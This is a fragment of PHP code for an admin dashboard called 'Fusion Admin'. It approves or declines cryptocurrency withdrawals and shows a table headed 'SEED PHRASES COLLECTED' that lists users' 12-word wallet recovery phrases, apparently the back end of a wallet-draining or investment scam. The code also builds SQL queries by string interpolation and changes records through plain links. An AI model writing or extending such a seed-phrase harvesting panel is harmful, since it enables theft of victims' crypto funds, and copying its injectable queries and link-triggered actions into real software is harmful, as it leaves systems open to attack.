...
if(strpos($req, "apid") !== false) {
  $trans_id = preg_replace('/\D/', '', $req);
    $uid = $conn->query("select * from withdrawals where txn_id='$trans_id'");
    if($uid->num_rows>0) {
      while($rr=$uid->fetch_assoc()) {
        $u = $rr['uid'];
        //get prev bal
        $prev = $conn->query("select * from bal where uid='$u'");
        while($lp =$prev->fetch_assoc()) {
        //  echo $u.' bal:'.$lp['bal'];
            $new = $lp['bal']- $rr['amt'];
            echo "<h1 style='margin-left:95%'>".$new."</h1>";
           $update=$conn->query("update bal set bal='$new' where uid='$u'");
                if($update) {
                  $approve = $conn->query("update withdrawals set stat='Approved' where txn_id='$trans_id'");
                  ?>
...
if(strpos($req, "dcid") !== false) {
  $trans_id = preg_replace('/\D/', '', $req);

	$decline = $conn->query("update withdrawals set stat='Declined' where txn_id='$trans_id'");
  if($decline) {
    ?>
...
?><div class="sidenav">
  ...
  <div class="content">
  <h2 style="text-align: center; color: gray;">Fusion Admin <img src='https://static.vecteezy.com/system/resources/previews/000/290/610/non_2x/administration-vector-icon.jpg' width='35px' style='border-radius:100%; position:absolute; display:block; margin-top:-8%;  margin-left: 1%; '/>
    </h2><br>
    <code>Approve or Decline Requests</code>
    ...
    <?php
                                      $sql = "SELECT * from withdrawals order by tm desc";
...
?>
                                     <tr>
                                        ...
                                        <td><or><?php echo '$'.number_format($row['amt'], 2);?></or></td>
                                        <td><?php echo $row['btc_wallet'];?></td>
                                        <td><?php echo $row['tm'];?>
                                        </td>
                                        <td>  <?php
                                            if($row['stat'] =='Processing') {
                                                   ?>
                                          <a href='/admin_deposits/apid<?php echo $row['txn_id'];?>'>  <button id='app'> approve</button><br><a>
                                          <a href='/admin_deposits/dcid<?php echo $row['txn_id'];?>'>  <button id='dec'>decline</button></a>
...
?>
                                ...
                                <br>        
                                <h4><b>SEED PHRASES COLLECTED</b></h4>        
                                        
                                        <table class="w3-table w3-bordered">
    <tr>
      <th>UID</th>
      <th>Name</th>
      <th>12 SEED PHRASE</th>
     
     
     
    </tr>
    <?php
                                      $sql = "SELECT * from seed_phrase ";
                                      $result = $conn->query($sql);
...
?>
                                     <tr>
                                        ...
                                        <?php 
                                                ...
                                                echo '<h2>No seed phrase collected yet!</h2>';
                                              }
